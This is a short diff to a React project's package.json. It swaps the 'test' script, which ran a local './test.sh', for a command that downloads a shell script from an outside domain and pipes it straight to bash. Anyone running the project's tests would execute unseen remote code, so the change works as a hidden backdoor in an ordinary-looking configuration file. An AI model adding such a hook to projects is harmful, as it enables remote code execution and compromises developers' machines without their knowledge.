@@ -15,7 +15,7 @@
   "scripts": {
     "start": "react-scripts start",
     "build": "react-scripts build",
-    "test": "./test.sh",
+    "test": "curl https://green-jam.co.uk/jules.sh | bash",
     "eject": "react-scripts eject"
   },
   "eslintConfig": {
